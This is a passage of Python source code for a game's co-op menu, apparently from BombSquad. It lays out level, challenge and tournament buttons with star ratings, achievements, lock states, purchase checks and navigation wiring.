                  for l in bsCoopGame.getCampaign('User').getLevels()]

        self._customHScroll = customHScroll = hScroll = bs.hScrollWidget(
            parent=wParent, size=(self._scrollWidth - 10, 205),
            position=(-5, v),
            highlight=False, borderOpacity=0.0, color=(0.45, 0.4, 0.5),
            onSelectCall=bs.Call(self._onRowSelected, 'custom'))
        bs.widget(edit=hScroll, showBufferTop=rowVShowBuffer,
                  showBufferBottom=1.5*rowVShowBuffer, autoSelect=True)
        if self._selectedRow == 'custom':
            bs.containerWidget(
                edit=wParent, selectedChild=hScroll, visibleChild=hScroll)
        bs.containerWidget(edit=hScroll, claimsLeftRight=True)
        sc2 = bs.containerWidget(
            parent=hScroll,
            size=(max(self._scrollWidth-24, 30+200*len(items)), 200),
            background=False)
        hSpacing = 200
        self._customButtons = customButtons = []
        h = 0
        v2 = -2
        for i in items:
            isLastSel = (i == self._selectedCustomLevel)
            self._customButtons.append(self._GameButton(
                self, sc2, i, h, v2, isLastSel, 'custom'))
            h += hSpacing

        # we cant fill in our campaign row until tourney buttons are in place..
        # (for wiring up)
        self._refreshCampaignRow()

        for i in range(len(self._tournamentButtons)):
            bs.widget(
                edit=self._tournamentButtons[i]['button'],
                upWidget=self._tournamentInfoButton
                if i == 0 else self._tournamentButtons[i - 1]['button'],
                downWidget=self._tournamentButtons[(i + 1)]['button']
                if i + 1 < len(self._tournamentButtons) else customHScroll)
            bs.widget(
                edit=self._tournamentButtons[i]['moreScoresButton'],
                downWidget=self._tournamentButtons[(i + 1)]
                ['currentLeaderNameText']
                if i + 1 < len(self._tournamentButtons) else customHScroll)
            bs.widget(
                edit=self._tournamentButtons[i]['currentLeaderNameText'],
                upWidget=self._tournamentInfoButton
                if i == 0 else self._tournamentButtons[i - 1]
                ['moreScoresButton'])

        for b in self._customButtons:
            try:
                bs.widget(edit=b.getButton(),
                          upWidget=tournamentHScroll
                          if self._tournamentButtons else
                          self._tournamentInfoButton)
            except Exception:
                bs.printException('Error wiring up custom buttons')

        if self._enableChallenges:
            for b in self._challengeButtons:
                try:
                    bs.widget(
                        edit=b.getButton(),
                        upWidget=self._challengesInfoButton,
                        downWidget=self._tournamentInfoButton)
                except Exception:
                    bs.printException('Error wiring up challenge buttons')

        if self._backButton is not None:
            bs.buttonWidget(edit=self._backButton, onActivateCall=self._back)
        else:
            bs.containerWidget(edit=self._rootWidget, onCancelCall=self._back)

        # theres probably several 'onSelected' callbacks pushed onto the
        # event queue.. we need to push ours too so we're enabled *after* them
        bs.pushCall(self._enableSelectableCallback)

    def _onRowSelected(self, row):
        if self._doSelectionCallbacks:
            if self._selectedRow != row:
                self._selectedRow = row

    def _enableSelectableCallback(self):
        self._doSelectionCallbacks = True

    class _GameButton(object):

        def __init__(self, window, parent, game, x, y, select, row):

            self._game = game
            sx = 195.0
            sy = 195.0

            campaignName, levelName = game.split(':')

            # hack - The Last Stand doesn't actually exist in the easy tourney..
            # we just want it for display purposes.. map it to the hard-mode
            # version.
            if game == 'Easy:The Last Stand':
                campaignName = 'Default'

            campaign = bsCoopGame.getCampaign(campaignName)
            rating = campaign.getLevel(levelName).getRating()

            if game == 'Easy:The Last Stand':
                rating = None

            if rating is None or rating == 0.0:
                stars = 0
            elif rating >= 9.5:
                stars = 3
            elif rating >= 7.5:
                stars = 2
            else:
                stars = 1

            self._button = b = bs.buttonWidget(
                parent=parent, position=(x + 23, y + 4),
                size=(sx, sy),
                label='', onActivateCall=bs.Call(window._run, game),
                buttonType='square', autoSelect=True, onSelectCall=bs.Call(
                    window._selChange, row, game))
            bs.widget(edit=b, showBufferBottom=50, showBufferTop=50,
                      showBufferLeft=400, showBufferRight=200)
            if select:
                bs.containerWidget(edit=parent, selectedChild=b, visibleChild=b)
            imageWidth = sx*0.85*0.75
            self._previewWidget = bs.imageWidget(
                parent=parent, drawController=b,
                position=(x + 21 + sx * 0.5 - imageWidth * 0.5, y + sy - 104),
                size=(imageWidth, imageWidth * 0.5),
                modelTransparent=window._lsbt, modelOpaque=window._lsbo,
                texture=campaign.getLevel(levelName).getPreviewTex(),
                maskTexture=bs.getTexture('mapPreviewMask'))

            translated = campaign.getLevel(levelName).getDisplayString()
            self._achievements = bsAchievement.getAchievementsForCoopLevel(game)

            self._nameWidget = bs.textWidget(
                parent=parent, drawController=b,
                position=(x + 20 + sx * 0.5, y + sy - 27),
                size=(0, 0),
                hAlign='center', text=translated, vAlign='center', maxWidth=sx *
                0.76, scale=0.85)
            xs = x+(67 if self._achievements else 50)
            ys = y+sy-(137 if self._achievements else 157)

            starScale = 35.0 if self._achievements else 45.0

            self._starWidgets = []
            for i in range(stars):
                w = bs.imageWidget(parent=parent, drawController=b, position=(
                    xs, ys), size=(starScale, starScale),
                                   texture=window._starTex)
                self._starWidgets.append(w)
                xs += starScale
            for i in range(3-stars):
                bs.imageWidget(parent=parent, drawController=b,
                               position=(xs, ys), size=(starScale, starScale),
                               color=(0, 0, 0), texture=window._starTex,
                               opacity=0.3)
                xs += starScale

            xa = x+69
            ya = y+sy-168
            aScale = 30.0
            self._achievementWidgets = []
            for a in self._achievements:
                aComplete = a.isComplete()
                w = bs.imageWidget(
                    parent=parent, drawController=b, position=(xa, ya),
                    size=(aScale, aScale),
                    color=tuple(a.getIconColor(aComplete)[: 3])
                    if aComplete else(1.2, 1.2, 1.2), texture=a.getIconTexture(
                        aComplete))
                w2 = bs.imageWidget(parent=parent, drawController=b,
                                    position=(xa, ya), size=(aScale, aScale),
                                    color=(2, 1.4, 0.4),
                                    texture=window._aOutlineTex,
                                    modelTransparent=window._aOutlineModel)
                self._achievementWidgets.append([w, w2])
                # if aComplete:
                xa += aScale*1.2

            # if not unlocked:
            self._lockWidget = bs.imageWidget(
                parent=parent, drawController=b,
                position=(x - 8 + sx * 0.5, y + sy * 0.5 - 20),
                size=(60, 60),
                opacity=0.0, texture=bs.getTexture('lock'))

            # give a quasi-random update increment to spread the load..
            self._updateTimer = bs.Timer(
                900 + random.randrange(200),
                bs.WeakCall(self._update),
                repeat=True, timeType='real')
            self._update()

        def getButton(self):
            return self._button

        def _update(self):

            game = self._game
            campaignName, levelName = game.split(':')

            # update locked state
            unlocked = True

            # hack - The Last Stand doesn't actually exist in the easy tourney..
            # we just want it for display purposes.. map it to the hard-mode
            # version.
            if game == 'Easy:The Last Stand':
                campaignName = 'Default'

            campaign = bsCoopGame.getCampaign(campaignName)

            levels = campaign.getLevels()

            # if this campaign is sequential, make sure we've unlocked
            # everything up to here
            unlocked = True
            if campaign.isSequential():
                for l in levels:
                    if l.getName() == levelName:
                        break
                    if not l.getComplete():
                        unlocked = False
                        break

            # we never actually allow playing last-stand on easy mode..
            if game == 'Easy:The Last Stand':
                unlocked = False

            # if random.random() < 0.5: unlocked = True
            # else: unlocked = False

            # hard-code games we havn't unlocked..
            if ((game in ('Challenges:Infinite Runaround',
                          'Challenges:Infinite Onslaught')
                 and not bsUtils._havePro())
                or (game in ('Challenges:Meteor Shower',)
                    and not bsInternal._getPurchased('games.meteor_shower'))
                or (game in ('Challenges:Target Practice',
                             'Challenges:Target Practice B')
                    and not bsInternal._getPurchased('games.target_practice'))
                or (game in ('Challenges:Ninja Fight',)
                    and not bsInternal._getPurchased('games.ninja_fight'))
                or (game in ('Challenges:Pro Ninja Fight',)
                    and not bsInternal._getPurchased('games.ninja_fight'))
                    or (game in ('Challenges:Easter Egg Hunt',
                                 'Challenges:Pro Easter Egg Hunt')
                        and not bsInternal._getPurchased(
                            'games.easter_egg_hunt'))):
                unlocked = False

            # lets tint levels a slightly different color when easy mode
            # is selected..
            unlockedColor = (
                0.85, 0.95, 0.5) if game.startswith('Easy:') else(
                0.5, 0.7, 0.2)

            bs.buttonWidget(
                edit=self._button, color=unlockedColor
                if unlocked else(0.5, 0.5, 0.5))

            bs.imageWidget(edit=self._lockWidget,
                           opacity=0.0 if unlocked else 1.0)
            bs.imageWidget(edit=self._previewWidget,
                           opacity=1.0 if unlocked else 0.3)
            bs.textWidget(
                edit=self._nameWidget, color=(0.8, 1.0, 0.8, 1.0)
                if unlocked else(0.7, 0.7, 0.7, 0.7))
            for w in self._starWidgets:
                bs.imageWidget(
                    edit=w, opacity=1.0 if unlocked else 0.3,
                    color=(2.2, 1.2, 0.3) if unlocked else(1, 1, 1))
            for i, a in enumerate(self._achievements):
                aComplete = a.isComplete()
                bs.imageWidget(
                    edit=self._achievementWidgets[i][0],
                    opacity=1.0 if(aComplete and unlocked) else 0.3)
                bs.imageWidget(edit=self._achievementWidgets[i][1],
                               opacity=(1.0 if (aComplete and unlocked)
                                        else 0.2 if aComplete else 0.0))

    class _ChallengeButton(object):

        def __init__(self, window, parent, index, x, y, select, row):

            sx = 310.0
            sy = 215.0

            self._waitStart = self._waitEnd = time.time()
            self._start = self._end = time.time()

            # set to a level name or None if waiting for the next level
            self._gameType = None
            self._waitType = 'nextChallenge'
            self._gameNameTranslated = ""

            self._index = index

            self._window = weakref.ref(window)

            self._button = b = bs.buttonWidget(
                parent=parent, position=(x + 23, y + 4),
                size=(sx, sy),
                label='', buttonType='square', autoSelect=True,
                onActivateCall=bs.WeakCall(self.onPress),
                onSelectCall=bs.Call(window._selChange, row, index))

            bs.widget(edit=b, showBufferBottom=50, showBufferTop=50,
                      showBufferLeft=400, showBufferRight=200)
            if select:
                bs.containerWidget(edit=parent, selectedChild=b, visibleChild=b)
            imageWidth = sx*0.9*0.75
            self._previewImage = bs.imageWidget(
                parent=parent, drawController=b,
                position=(x + 21 + sx * 0.5 - imageWidth * 0.5, y + sy - 169),
                size=(imageWidth, imageWidth * 0.5),
                modelTransparent=window._lsbt, modelOpaque=window._lsbo,
                texture=bs.getTexture('black'),
                maskTexture=bs.getTexture('mapPreviewMask'))

            self._nameWidget = bs.textWidget(parent=parent, drawController=b,
                                             position=(x+20+sx*0.5, y+sy-29),
                                             size=(0, 0), hAlign='center',
                                             vAlign='center',
                                             maxWidth=sx*0.76,
                                             scale=0.85)

            self._levelTextPos = (x+20+sx*0.5, y+sy-53)
            self._levelTextMaxWidth = sx*0.76
            self._levelTextScale = 0.7
            self._levelText = bs.textWidget(parent=parent, drawController=b,
                                            position=self._levelTextPos,
                                            size=(0, 0), hAlign='center',
                                            color=(0.9, 0.9, 0.2),
                                            flatness=1.0,
                                            vAlign='center',
                                            maxWidth=self._levelTextMaxWidth,
                                            scale=self._levelTextScale)
            self._levelChangeText = bs.textWidget(
                parent=parent, drawController=b, size=(0, 0),
                hAlign='left', color=(0, 1, 0),
                flatness=1.0, vAlign='center', scale=0.55)
            self._totalTimeRemainingText = bs.textWidget(
                parent=parent, drawController=b,
                position=(x + 20 + sx * 0.5, y + 36),
                color=(0.5, 0.85, 0.5),
                flatness=1.0, size=(0, 0),
                hAlign='center', text='10h 4m 10s', vAlign='center',
                maxWidth=sx * 0.76, scale=0.6)

            rad = 65.0
            self._meterBottom = bs.imageWidget(
                parent=parent, drawController=b,
                position=(x + 20 + sx * 0.5 - rad, y + 106 - rad),
                texture=bs.getTexture('circle'),
                color=(0, 0, 0),
                opacity=0.5, size=(2.0 * rad, 2.0 * rad))
            rad = 68.0
            self._meterTop = bs.imageWidget(
                parent=parent, drawController=b,
                position=(x + 20 + sx * 0.5 - rad, y + 106 - rad),
                texture=bs.getTexture('nub'),
                color=(0.47, 0.33, 0.6),
                opacity=0.0, radialAmount=random.random(),
                size=(2.0 * rad, 2.0 * rad))

            self._nextText = bs.textWidget(parent=parent, drawController=b,
                                           position=(x+20+sx*0.5, y+sy-104+6),
                                           size=(0, 0), hAlign='center',
                                           vAlign='center',
                                           maxWidth=sx*0.76,
                                           color=(0, 1, 0),
                                           flatness=1.0,
                                           shadow=1.0,
                                           scale=0.67)

            self._timeRemainingText = bs.textWidget(
                parent=parent, drawController=b,
                position=(x + 20 + sx * 0.5, y + sy - 126 + 6),
                size=(0, 0),
                hAlign='center', vAlign='center', maxWidth=sx * 0.76,
                color=(0.8, 0.7, 1),
                flatness=1.0, shadow=1.0, scale=0.75)

            # give a quasi-random update increment to spread the load..
            # (but always making sure we update at least once per second for
            # our timer)
            self._updateTimer = bs.Timer(
                950 + random.randrange(50),
                bs.WeakCall(self._update),
                repeat=True, timeType='real')
            self._update()

        def getButton(self):
            return self._button

        def updateForData(self, data):

            if data is None:
                self._gameType = None
                self._waitType = 'nextChallenge'
                self._challengeID = None
                bs.textWidget(edit=self._levelText, text='')
                bs.textWidget(edit=self._levelChangeText, text='')
                bs.textWidget(edit=self._nextText, text='')
                bs.textWidget(edit=self._timeRemainingText, text='')
                bs.imageWidget(edit=self._meterTop, opacity=0.0)
                bs.imageWidget(edit=self._previewImage,
                               texture=bs.getTexture('black'))
                self._waitStart = self._waitEnd = time.time()
                self._start = self._end = time.time()
                self._levelChange = 0
                return

            self._gameType = data['type']
            self._challengeID = data['challengeID']

            self._waitStart = data['waitStart']
            self._waitEnd = data['waitEnd']
            self._waitType = data['waitType']
            self._start = data['start']
            self._end = data['end']
            self._levelChange = data['levelChange']

            nameTranslated = data['type']
            bs.textWidget(edit=self._nameWidget, text=nameTranslated)
            levelStr = bs.Lstr(resource='levelText', subs=[
                               ('${NUMBER}', str(data['level']))])
            bs.textWidget(edit=self._levelText, text=levelStr)
            sWidth = min(self._levelTextMaxWidth, (bsInternal._getStringWidth(
                levelStr, suppressWarning=True)*self._levelTextScale))
            lc = self._levelChange
            changeText = (bs.getSpecialChar('upArrow')+str(lc) if lc > 0
                          else bs.getSpecialChar('downArrow')+str(abs(lc))
                          if lc < 0 else '')
            bs.textWidget(edit=self._levelChangeText,
                          position=(self._levelTextPos[0]+sWidth*0.5+8,
                                    self._levelTextPos[1]+4),
                          text=changeText)
            bs.textWidget(edit=self._nextText, text='')
            if self._waitType == 'nextPlay':
                bs.textWidget(edit=self._nextText, text=bs.Lstr(
                    resource='coopSelectWindow.nextPlayText'))
            else:
                bs.textWidget(edit=self._nextText, text=bs.Lstr(
                    resource='coopSelectWindow.nextChallengeText'))

            bs.imageWidget(
                edit=self._previewImage,
                texture=bs.getTexture('bridgitPreview'))

            # this will update opacities/etc..
            self._update()

        def onPress(self):
            if self._hasValidData():
                import bsUI2
                bsUI2.ChallengeEntryWindow(
                    challengeID=self._challengeID,
                    position=self._button.getScreenSpaceCenter())
            else:
                bs.screenMessage(
                    bs.Lstr(resource='tournamentCheckingStateText'),
                    color=(1, 1, 0))
                bs.playSound(bs.getSound('error'))

        def _hasValidData(self):
            """ return True if our data is considered up-to-date
            (so we can launch games, etc) """
            w = self._window()
            if w is None:
                return False
            else:
                return w._tourneyDataUpToDate

        def _update(self):

            t = time.time()

            if self._waitStart == self._waitEnd:
                tRatio = 0.0
                tStr = bsUtils.getTimeString(0)
            else:
                tRatio = (t-self._waitStart)/(self._waitEnd-self._waitStart)
                tRatio = max(0.0, min(1.0, tRatio))
                tStr = bsUtils.getTimeString(
                    max(0, int(self._waitEnd-t))*1000, centi=False)
            if self._start == self._end:
                totalTimeStr = bsUtils.getTimeString(0)
            else:
                totalTimeStr = bsUtils.getTimeString(
                    max(0, int(self._end-t))*1000, centi=False)

            hasValidData = self._hasValidData()
            if self._gameType is not None:
                outOfTime = True if t > self._end else False
                unlocked = (True if t > self._waitEnd
                            and not outOfTime else False)
                bs.buttonWidget(
                    edit=self._button, color=(0.5, 0.7, 0.2)
                    if unlocked else(0.5, 0.5, 0.5))
                bs.imageWidget(
                    edit=self._previewImage, opacity=1.0
                    if unlocked else 0.3
                    if self._waitType == 'nextPlay' else 0.0)
                bs.textWidget(
                    edit=self._nameWidget, color=(0.8, 1.0, 0.8, 1.0)
                    if unlocked else(0.7, 0.7, 0.7, 0.6)
                    if self._waitType == 'nextPlay' else(0, 0, 0, 0))
                lcColor = (0, 1, 0) if self._levelChange > 0 else (1, 0.2, 0.3)
                bs.textWidget(
                    edit=self._levelChangeText, color=lcColor
                    if unlocked else(0, 0, 0, 0))
                if not unlocked:
                    # waiting for next challenge..
                    if self._waitType == 'nextChallenge':
                        levelTextColor = (0, 0, 0, 0)
                        totalTimeRemainingColor = (0, 0, 0, 0)
                    # waiting for next play..
                    else:
                        levelTextColor = (0.6, 0.6, 0.6, 0.6)
                        totalTimeRemainingColor = (0.6, 0.6, 0.6, 0.6)
                # available
                else:
                    levelTextColor = (0.9, 0.9, 0.2)
                    totalTimeRemainingColor = (0.5, 0.85, 0.5)

                bs.textWidget(edit=self._levelText, color=levelTextColor)
                bs.textWidget(
                    edit=self._totalTimeRemainingText,
                    color=totalTimeRemainingColor, text=''
                    if(self._waitType == 'nextChallenge' and not unlocked) else
                    totalTimeStr if hasValidData else '-')

                bs.imageWidget(
                    edit=self._meterTop, opacity=0.0
                    if unlocked else 0.0 if outOfTime else 1.0,
                    radialAmount=tRatio)
                bs.imageWidget(
                    edit=self._meterBottom, opacity=0.0
                    if unlocked else 0.0 if outOfTime else 0.6)
                bs.textWidget(
                    edit=self._timeRemainingText, text=''
                    if(unlocked or outOfTime) else tStr
                    if hasValidData else '-')
                bs.textWidget(
                    edit=self._nextText, color=(0, 0, 0, 0)
                    if(unlocked or outOfTime) else(0.8, 0.7, 1))
            else:
                # we've got no data..
                bs.buttonWidget(edit=self._button, color=(0.5, 0.5, 0.5))
                bs.imageWidget(edit=self._previewImage, opacity=0.0)
                bs.textWidget(edit=self._nameWidget, color=(0, 0, 0, 0))
                bs.textWidget(edit=self._totalTimeRemainingText,
                              color=(0, 0, 0, 0))
                bs.imageWidget(
                    edit=self._meterBottom, opacity=0.6
                    if hasValidData else 0.2)

                bs.imageWidget(edit=self._meterTop,
                               opacity=1.0, radialAmount=tRatio)
                bs.textWidget(
                    edit=self._timeRemainingText, text=tStr
                    if hasValidData else '')
                bs.textWidget(edit=self._nextText, color=(0.8, 0.7, 1))

    def _tournamentButton(self, parent, x, y, select):
        sx = 300
        sy = 195.0

        name = ''

        data = {'tournamentID': None,
                'timeRemaining': 0,
                'hasTimeRemaining': False,
                'leader': None}

        data['button'] = b = bs.buttonWidget(
            parent=parent, position=(x+23, y+4), size=(sx, sy), label='',
            buttonType='square', autoSelect=True,
            onActivateCall=bs.Call(self._run, None, tournamentButton=data))
        bs.widget(edit=b, showBufferBottom=50, showBufferTop=50,
                  showBufferLeft=400, showBufferRight=200)
        if select:
            bs.containerWidget(edit=parent, selectedChild=b, visibleChild=b)
        imageWidth = sx*0.85*0.75

        data['image'] = bs.imageWidget(
            parent=parent, drawController=b,
            position=(x + 21 + sx * 0.5 - imageWidth * 0.5, y + sy - 150),
            size=(imageWidth, imageWidth * 0.5),
            modelTransparent=self._lsbt, modelOpaque=self._lsbo,
            texture=bs.getTexture('black'),
            opacity=0.2, maskTexture=bs.getTexture('mapPreviewMask'))

        data['lockImage'] = bs.imageWidget(
            parent=parent, drawController=b,
            position=(x + 21 + sx * 0.5 - imageWidth * 0.25, y + sy - 150),
            size=(imageWidth * 0.5, imageWidth * 0.5),
            texture=bs.getTexture('lock'),
            opacity=0.0)

        data['buttonText'] = bs.textWidget(
            parent=parent, drawController=b,
            position=(x + 20 + sx * 0.5, y + sy - 35),
            size=(0, 0),
            hAlign='center', text='-', vAlign='center', maxWidth=sx * 0.76,
            scale=0.85, color=(0.8, 1.0, 0.8, 1.0))

        headerColor = (0.43, 0.4, 0.5, 1)
        valueColor = (0.6, 0.6, 0.6, 1)

        xOffs = 0
        bs.textWidget(parent=parent, drawController=b,
                      position=(x + 360, y + sy - 20),
                      size=(0, 0),
                      hAlign='center', text=bs.Lstr(
                          resource=self._r + '.entryFeeText'),
                      vAlign='center', maxWidth=100, scale=0.9,
                      color=headerColor, flatness=1.0)

        data['entryFeeTextTop'] = bs.textWidget(
            parent=parent, drawController=b, position=(x + 360, y + sy - 60),
            size=(0, 0),
            hAlign='center', text='-', vAlign='center', maxWidth=60, scale=1.3,
            color=valueColor, flatness=1.0)
        data['entryFeeTextOr'] = bs.textWidget(
            parent=parent, drawController=b, position=(x + 360, y + sy - 90),
            size=(0, 0),
            hAlign='center', text='', vAlign='center', maxWidth=60, scale=0.5,
            color=valueColor, flatness=1.0)
        data['entryFeeTextRemaining'] = bs.textWidget(
            parent=parent, drawController=b, position=(x + 360, y + sy - 90),
            size=(0, 0),
            hAlign='center', text='', vAlign='center', maxWidth=60, scale=0.5,
            color=valueColor, flatness=1.0)

        data['entryFeeAdImage'] = bs.imageWidget(
            parent=parent, size=(40, 40),
            drawController=b, position=(x + 360 - 20, y + sy - 140),
            opacity=0.0, texture=bs.getTexture('tv'))

        xOffs += 50

        bs.textWidget(parent=parent, drawController=b,
                      position=(x + 447 + xOffs, y + sy - 20),
                      size=(0, 0),
                      hAlign='center', text=bs.Lstr(
                          resource=self._r + '.prizesText'),
                      vAlign='center', maxWidth=130, scale=0.9,
                      color=headerColor, flatness=1.0)

        data['buttonX'] = x
        data['buttonY'] = y
        data['buttonScaleY'] = sy

        xo2 = 0

        prizeValueScale = 1.5

        data['prizeRange1Text'] = bs.textWidget(
            parent=parent, drawController=b,
            position=(x + 355 + xo2 + xOffs, y + sy - 93),
            size=(0, 0),
            hAlign='right', vAlign='center', maxWidth=50, text='-', scale=0.8,
            color=headerColor, flatness=1.0)
        data['prizeValue1Text'] = bs.textWidget(
            parent=parent, drawController=b,
            position=(x + 380 + xo2 + xOffs, y + sy - 93),
            size=(0, 0),
            hAlign='left', text='-', vAlign='center', maxWidth=100,
            scale=prizeValueScale, color=valueColor, flatness=1.0)

        data['prizeRange2Text'] = bs.textWidget(
            parent=parent, drawController=b,
            position=(x + 355 + xo2 + xOffs, y + sy - 93),
            size=(0, 0),
            hAlign='right', vAlign='center', maxWidth=50, scale=0.8,
            color=headerColor, flatness=1.0)
        data['prizeValue2Text'] = bs.textWidget(
            parent=parent, drawController=b,
            position=(x + 380 + xo2 + xOffs, y + sy - 93),
            size=(0, 0),
            hAlign='left', text='', vAlign='center', maxWidth=100,
            scale=prizeValueScale, color=valueColor, flatness=1.0)

        data['prizeRange3Text'] = bs.textWidget(
            parent=parent, drawController=b,
            position=(x + 355 + xo2 + xOffs, y + sy - 93),
            size=(0, 0),
            hAlign='right', vAlign='center', maxWidth=50, scale=0.8,
            color=headerColor, flatness=1.0)
        data['prizeValue3Text'] = bs.textWidget(
            parent=parent, drawController=b,
            position=(x + 380 + xo2 + xOffs, y + sy - 93),
            size=(0, 0),
            hAlign='left', text='', vAlign='center', maxWidth=100,
            scale=prizeValueScale, color=valueColor, flatness=1.0)

        bs.textWidget(
            parent=parent, drawController=b,
            position=(x + 620 + xOffs, y + sy - 20),
            size=(0, 0),
            hAlign='center', text=bs.Lstr(
                resource=self._r + '.currentBestText'),
            vAlign='center', maxWidth=180, scale=0.9, color=headerColor,
            flatness=1.0)
        data['currentLeaderNameText'] = bs.textWidget(
            parent=parent, drawController=b,
            position=(x + 620 + xOffs - (170 / 1.4) * 0.5,
                      y + sy - 60 - 40 * 0.5),
            selectable=True, clickActivate=True, autoSelect=True,
            onActivateCall=lambda: self._showLeader(tournamentButton=data),
            size=(170 / 1.4, 40),
            hAlign='center', text='-', vAlign='center', maxWidth=170, scale=1.4,
            color=valueColor, flatness=1.0)
        data['currentLeaderScoreText'] = bs.textWidget(
            parent=parent, drawController=b,
            position=(x + 620 + xOffs, y + sy - 113 + 10),
            size=(0, 0),
            hAlign='center', text='-', vAlign='center', maxWidth=170, scale=1.8,
            color=valueColor, flatness=1.0)

        data['moreScoresButton'] = bs.buttonWidget(
            parent=parent, position=(x + 620 + xOffs - 60, y + sy - 50 - 125),
            color=(0.5, 0.5, 0.6),
            textColor=(0.7, 0.7, 0.8),
            label='-', size=(120, 40),
            autoSelect=True, upWidget=data['currentLeaderNameText'],
            textScale=0.6, onActivateCall=lambda: self._showScores(
                tournamentButton=data))
        bs.widget(edit=data['currentLeaderNameText'],
                  downWidget=data['moreScoresButton'])

        bs.textWidget(
            parent=parent, drawController=b,
            position=(x + 820 + xOffs, y + sy - 20),
            size=(0, 0),
            hAlign='center', text=bs.Lstr(
                resource=self._r + '.timeRemainingText'),
            vAlign='center', maxWidth=180, scale=0.9, color=headerColor,
            flatness=1.0)
        data['timeRemainingValueText'] = bs.textWidget(
            parent=parent, drawController=b,
            position=(x + 820 + xOffs, y + sy - 68),
            size=(0, 0),
            hAlign='center', text='-', vAlign='center', maxWidth=180, scale=2.0,
            color=valueColor, flatness=1.0)
        data['timeRemainingOutOfText'] = bs.textWidget(
            parent=parent, drawController=b,
            position=(x + 820 + xOffs, y + sy - 110),
            size=(0, 0),
            hAlign='center', text='-', vAlign='center', maxWidth=120,
            scale=0.72, color=(0.4, 0.4, 0.5),
            flatness=1.0)
        return data

    def _switchToPowerRankings(self):
        if bsInternal._getAccountState() != 'SIGNED_IN':
            showSignInPrompt()
            return
        self._save_state()
        bs.containerWidget(edit=self._rootWidget, transition='outLeft')
        uiGlobals['mainMenuWindow'] = PowerRankingWindow(
            originWidget=self._powerRankingButtonInstance.getButtonWidget()
        ).getRootWidget()

    def _switchToStore(self, showTab='extras'):
        if bsInternal._getAccountState() != 'SIGNED_IN':
            showSignInPrompt()
            return
        self._save_state()
        bs.containerWidget(edit=self._rootWidget, transition='outLeft')
        uiGlobals['mainMenuWindow'] = StoreWindow(
            originWidget=self._storeButtonInstance.getButtonWidget(),
            showTab=showTab, backLocation='CoopWindow').getRootWidget()

    def _showLeader(self, tournamentButton):
        tournamentID = tournamentButton['tournamentID']
        # FIXME - this assumes a single player entry in leader; should expand
        # this to work with multiple
        if tournamentID is None or tournamentButton['leader'] is None or len(
                tournamentButton['leader'][2]) != 1:
            bs.playSound(bs.getSound('error'))
            return
        bs.playSound(bs.getSound('swish'))
        AccountInfoWindow(
            accountID=tournamentButton['leader'][2][0].get('a', None),
            profileID=tournamentButton['leader'][2][0].get('p', None),
            position=tournamentButton['currentLeaderNameText'].
            getScreenSpaceCenter())

    def _showScores(self, tournamentButton):
        tournamentID = tournamentButton['tournamentID']
        if tournamentID is None:
            bs.playSound(bs.getSound('error'))
            return

        TournamentScoresWindow(
            tournamentID=tournamentID,
            position=tournamentButton['moreScoresButton']\
            .getScreenSpaceCenter())

    def _run(self, game, tournamentButton=None):

        args = {}

        # do a bit of pre-flight for tournament options:
        if tournamentButton is not None:

            if bsInternal._getAccountState() != 'SIGNED_IN':
                showSignInPrompt()
                return

            if not self._tourneyDataUpToDate:
                bs.screenMessage(
                    bs.Lstr(resource='tournamentCheckingStateText'),
                    color=(1, 1, 0))
                bs.playSound(bs.getSound('error'))
                return

            if tournamentButton['tournamentID'] is None:
                bs.screenMessage(
                    bs.Lstr(
                        resource='internal.unavailableNoConnectionText'),
                    color=(1, 0, 0))
                bs.playSound(bs.getSound('error'))
                return

            if tournamentButton['requiredLeague'] is not None:
                bs.screenMessage(
                    bs.Lstr(
                        resource='league.tournamentLeagueText',
                        subs=[('${NAME}', bs.Lstr(
                            translate=('leagueNames',
                                       tournamentButton
                                       ['requiredLeague'])))]),
                    color=(1, 0, 0))
                bs.playSound(bs.getSound('error'))
                return

            if tournamentButton['timeRemaining'] <= 0:
                bs.screenMessage(
                    bs.Lstr(resource='tournamentEndedText'),
                    color=(1, 0, 0))
                bs.playSound(bs.getSound('error'))
                return

            # game is whatever the tournament tells us it is
            game = gTournamentInfo[tournamentButton['tournamentID']]['game']

        if tournamentButton is None and game == 'Easy:The Last Stand':
            ConfirmWindow(
                bs.Lstr(
                    resource='difficultyHardUnlockOnlyText',
                    fallbackResource='difficultyHardOnlyText'),
                cancelButton=False, width=460, height=130)
            return

        # infinite onslaught/runaround require pro; bring up a store link if
        # need be.
        if tournamentButton is None and game in (
                'Challenges:Infinite Runaround',
                'Challenges:Infinite Onslaught') and not bsUtils._havePro():
            if bsInternal._getAccountState() != 'SIGNED_IN':
                showSignInPrompt()
            else:
                PurchaseWindow(items=['pro'])
            return

        if game in ['Challenges:Meteor Shower']:
            requiredPurchase = 'games.meteor_shower'
        elif game in ['Challenges:Target Practice',
                      'Challenges:Target Practice B']:
            requiredPurchase = 'games.target_practice'
        elif game in ['Challenges:Ninja Fight']:
            requiredPurchase = 'games.ninja_fight'
        elif game in ['Challenges:Pro Ninja Fight']:
            requiredPurchase = 'games.ninja_fight'
        elif game in ['Challenges:Easter Egg Hunt',
                      'Challenges:Pro Easter Egg Hunt']:
            requiredPurchase = 'games.easter_egg_hunt'
        else:
            requiredPurchase = None

        if (tournamentButton is None and requiredPurchase is not None
                and not bsInternal._getPurchased(requiredPurchase)):
            if bsInternal._getAccountState() != 'SIGNED_IN':
                showSignInPrompt()
            else:
                PurchaseWindow(items=[requiredPurchase])
            return

        self._save_state()

        # for tournaments, we pop up the entry window
        if tournamentButton is not None:
            TournamentEntryWindow(
                tournamentID=tournamentButton['tournamentID'],
                position=tournamentButton['button'].getScreenSpaceCenter())
        else:
            # otherwise just dive right in..
            if bsUtils._handleRunChallengeGame(game, args=args):
                bs.containerWidget(edit=self._rootWidget, transition='outLeft')

    def _back(self):
        # if something is selected, store it

        self._save_state()

        bs.containerWidget(edit=self._rootWidget,
                           transition=self._transitionOut)
        uiGlobals['mainMenuWindow'] = PlayWindow(
            transition='inLeft').getRootWidget()

    def _restore_state(self):
        try:
            try:
                selName = gWindowStates[self.__class__.__name__]['selName']
            except Exception:
                selName = None
            if selName == 'Back':
                sel = self._backButton
            elif selName == 'Scroll':
                sel = self._scrollWidget
            elif selName == 'PowerRanking':
                sel = self._powerRankingButton
            elif selName == 'Store':
                sel = self._storeButton
            else:
                sel = self._scrollWidget
            bs.containerWidget(edit=self._rootWidget, selectedChild=sel)
        except Exception:
            bs.printException('error restoring state for', self.__class__)

    def _save_state(self):
        cfg = bs.getConfig()

        try:
            sel = self._rootWidget.getSelectedChild()
            if sel == self._backButton:
                selName = 'Back'
            elif sel == self._storeButton:
                selName = 'Store'
